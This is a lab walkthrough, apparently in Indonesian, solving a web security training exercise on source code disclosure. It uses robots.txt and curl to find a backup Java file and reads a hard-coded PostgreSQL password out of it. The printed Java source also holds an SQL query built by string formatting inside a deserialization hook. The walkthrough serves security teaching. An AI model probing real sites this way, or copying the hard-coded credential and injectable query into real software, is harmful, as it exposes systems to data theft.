# Lab: Source code disclosure via backup files

**Category**: Information Disclosure / Source Code Disclosure  
**Goal**: Mengidentifikasi direktori tersembunyi (*hidden directory*) tempat ditemukannya file cadangan (*backup file*) source code, lalu menguji *hard-coded credentials* (password database PostgreSQL) untuk menyelesaikan lab.

---

## 📌 Overview & Prerequisite Knowledge

Sebelum menyelesaikan lab ini, beberapa konsep penting yang perlu dipahami:
- **Information Disclosure (Kebocoran Informasi)**: Kerentanan di mana aplikasi web secara tidak sengaja membocorkan informasi sensitif (seperti source code, file konfigurasi, atau *backup files*) kepada publik.
- **`robots.txt` Disclosure**: File `robots.txt` digunakan untuk memberikan petunjuk kepada mesin pencari (*web crawlers*) mengenai direktori mana yang boleh/tidak boleh di-index. Sering kali direktori yang terdaftar di `Disallow:` justru mengungkap lokasi folder rahasia/sensitif seperti `/backup` atau `/admin`.
- **Hard-coded Credentials**: Praktik buruk menyimpang (*anti-pattern*) di mana pengembang menanamkan password database, API key, atau rahasia lainnya secara langsung di dalam source code aplikasi.

---

## 🎯 Solution Summary

1. Akses file `/robots.txt` pada web target untuk menemukan direktori sensitif yang dilarang (`Disallow: /backup`).
2. Telusuri direktori `/backup` untuk mengidentifikasi keberadaan file cadangan source code `ProductTemplate.java.bak`.
3. Unduh atau baca isi file `/backup/ProductTemplate.java.bak` untuk menganalisis source code Java.
4. Temukan *hard-coded database password* pada objek `ConnectionBuilder` PostgreSQL (misalnya: `pyf3g3r21zz3ln76opgl5ekr8ug6eojn`).
5. Klik **Submit solution** pada lab, lalu masukkan password database tersebut untuk menyelesaikan lab.

![Lab Solution Overview](../Image%20Asset/Source%20code%20disclosure/Lab%20Backup%20File%20Source%20code%20disclosure%20via%20backup%20files.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Reconnaissance via `robots.txt`
Lakukan pemindaian direktori dasar (*reconnaissance*) dengan mengakses file `/robots.txt` melalui browser atau Terminal Linux (`curl`):

```bash
curl -s https://0a9500970318e3d88019762200bd0002.web-security-academy.net/robots.txt
```

Output:
```http
User-agent: *
Disallow: /backup
```

> [!NOTE]
> File `robots.txt` secara eksplisit menunjukkan direktori `/backup` yang disembunyikan dari web crawler.

---

### Step 2: Directory Listing pada Hidden Folder `/backup`
Akses direktori `/backup` melalui terminal (`curl`) atau browser:

```bash
curl -s https://0a9500970318e3d88019762200bd0002.web-security-academy.net/backup
```

Output:
```html
<html>
    <head>
        <title>Index of /backup</title>
        <style>
            table { margin: 1em; }
            td { padding: 0.2em; }
        </style>
    </head>
    <body>
        <h1>Index of /backup</h1>
        <table>
            <tr><th>Name</th><th>Size</th></tr>
            <tr><td><a href='/backup/ProductTemplate.java.bak'>ProductTemplate.java.bak</a></td><td>1647B</td></tr>
        </table>
    </body>
</html>
```

Dari hasil *Directory Listing* di atas, ditemukan satu file cadangan source code Java bernama `ProductTemplate.java.bak`.

---

### Step 3: Inspect Source Code & Extract Hard-coded Credentials
Unduh dan baca konten file `/backup/ProductTemplate.java.bak` menggunakan `curl`:

```bash
curl -s https://0a9500970318e3d88019762200bd0002.web-security-academy.net/backup/ProductTemplate.java.bak
```

Isi Source Code Java:
```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "pyf3g3r21zz3ln76opgl5ekr8ug6eojn"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

Perhatikan bagian inisialisasi koneksi database PostgreSQL (`ConnectionBuilder`):
```java
ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
        "org.postgresql.Driver",
        "postgresql",
        "localhost",
        5432,
        "postgres",
        "postgres",
        "pyf3g3r21zz3ln76opgl5ekr8ug6eojn" // Hard-coded Database Password
).withAutoCommit();
```

Kredensial Password Database PostgreSQL yang ditemukan:
```text
pyf3g3r21zz3ln76opgl5ekr8ug6eojn
```

---

### Step 4: Submit Solution
Kembali ke halaman utama aplikasi web di browser, klik tombol **Submit solution**, lalu masukkan password database tersebut: `pyf3g3r21zz3ln76opgl5ekr8ug6eojn`.

![Lab Solved Confirmation](../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260804194452.png)

> [!SUCCESS]
> **Lab Solved**: Password database berhasil disubmit dan lab dinyatakan selesai!